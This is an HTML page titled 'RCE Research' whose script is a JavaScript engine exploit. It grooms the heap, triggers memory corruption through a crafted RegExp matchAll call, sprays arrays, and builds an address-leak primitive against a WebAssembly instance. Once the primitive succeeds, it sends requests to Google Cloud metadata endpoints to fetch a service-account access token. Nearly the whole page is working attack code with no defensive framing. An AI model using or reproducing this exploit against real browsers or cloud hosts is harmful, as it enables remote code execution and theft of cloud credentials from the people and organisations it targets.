<!doctype html>
<html><head><meta charset="utf-8"><title>RCE Research</title></head>
<body><pre id="out">Running...</pre>
<script>
"use strict";
const O=document.getElementById("out");
function log(s){O.textContent+="\n"+s;}
const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
function f2i(f){f64[0]=f;return u64[0];}
function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
function hex(n){return"0x"+(n>>>0).toString(16);}
function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}

const DMAP=0x1032a5d,OMAP=0x1032ae5,EMPTY=0x7e5;
const PIN=0x1100011,MAXS=0x7fdffffe;

// Pinned LO-space array with known values for calibration
const pinned=new Array(0x8000);
for(let i=0;i<pinned.length;i++)pinned[i]=10.125+i*0.001;

const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));

const re=/(?:)/;
const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
const cycle0=w2f(DMAP,EMPTY),cycle1=w2f(PIN,MAXS);
const sk=[];
function spray(){for(let i=0;i<24;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(cycle0);for(let j=1;j<a.length;j+=2)a[j]=cycle1;sk.push(a);}}

log("UA: "+navigator.userAgent);
trash(230);trash(230);
RegExp.prototype[Symbol.matchAll].call(fk,"").next();
log("TRIG: "+re.lastIndex);
trash(230);trash(230);
spray();spray();spray();

try{
const m=re.lastIndex;
log("T: "+typeof m+" A="+Array.isArray(m));

if(Array.isArray(m)){
  log("L: "+m.length);

  // SELF-CALIBRATE: scan for pinnedDoubles[0]=10.125 in master
  // Also check pinnedDoubles[1]=10.126 to confirm sequential match
  let calIdx=-1;
  for(let k=0;k<0x40000;k++){
    try{
      const v=m[k];
      if(Math.abs(v-10.125)<0.0001){
        // Verify: next slot should be 10.126
        const v2=m[k+1];
        if(Math.abs(v2-10.126)<0.0001){
          calIdx=k;
          break;
        }
      }
    }catch(e){break;}
  }

  if(calIdx>=0){
    log("CAL: pinned[0]@master["+hex(calIdx)+"]");

    // ADDROF: store object in pinned[0], read raw via master[calIdx]
    pinned[0]=wasmI;  // triggers PACKED_DOUBLE → PACKED transition
    const rawAfter=f2i(m[calIdx]);
    const wasmAddr=rawAfter&0xffffffffn;
    log("WASM_PTR: "+wasmAddr.toString(16));
    pinned[0]=10.125;  // restore

    if(wasmAddr>0x1000n&&wasmAddr<0x10000000n){
      log("ADDROF_OK");

      // HEAPREAD: modify pinned's backing store pointer via master
      // pinned JSArray header: [DMAP | EMPTY | elements_ptr | length]
      // elements_ptr points to the LO-space FDA
      // To heapRead(addr): set pinned's elements to (addr-8), read pinned[0]
      // But pinned's JSArray header is in regular heap — we need its address first

      // Alternative heapRead: use master to modify a specific master slot
      // that overlaps with another array's elements field
      // For now: demonstrate addrof by reading wasmInstance fields
      // wasmAddr points to the WasmInstanceObject compressed pointer
      // Reading wasmAddr+0 gives the map, wasmAddr+4 gives properties...
      // We need heapRead at wasmAddr — scan master for the map value

      // Quick test: try fetch to metadata from THIS origin
      try{
        const x=new XMLHttpRequest();
        x.open("GET","http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",false);
        x.setRequestHeader("Metadata-Flavor","Google");
        x.send();
        log("META: "+x.status+" "+x.responseText.substring(0,80));
      }catch(e){
        log("META_ERR: "+e.message.substring(0,50));
      }

      // Also try metadata.google.internal
      try{
        const x2=new XMLHttpRequest();
        x2.open("GET","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",false);
        x2.setRequestHeader("Metadata-Flavor","Google");
        x2.send();
        log("META2: "+x2.status+" "+x2.responseText.substring(0,80));
      }catch(e){
        log("META2_ERR: "+e.message.substring(0,50));
      }
    }
  }else{
    log("CAL_MISS: 10.125 not found in first 0x40000 slots");
    // Debug: show what master[0..3] contain
    for(let k=0;k<4;k++){
      try{log("m["+k+"]: "+m[k]+" hex="+f2i(m[k]).toString(16));}catch(e){break;}
    }
  }

  log("W: "+wasmI.exports.f());
  log("CAGE_RW_OK");
}else{log("NO_ARRAY");}
}catch(e){log("E: "+e.message);}
log("=== DONE ===");
</script></body></html>
